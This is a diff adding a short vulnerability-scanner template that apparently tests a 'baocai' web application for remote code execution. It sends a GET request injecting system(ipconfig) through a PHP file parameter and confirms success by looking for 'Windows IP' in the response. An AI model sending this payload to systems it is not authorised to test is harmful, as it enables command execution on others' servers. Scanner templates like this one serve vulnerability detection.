@@ -1,0 +1,8 @@
+name: baocai-rce
+rules:
+  r0:
+    request:
+      method: GET
+      path: /lib/classes/googleChart/markers/GoogleChartMapMarker.php?google88990=system(ipconfig);
+    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
+expression: r0()
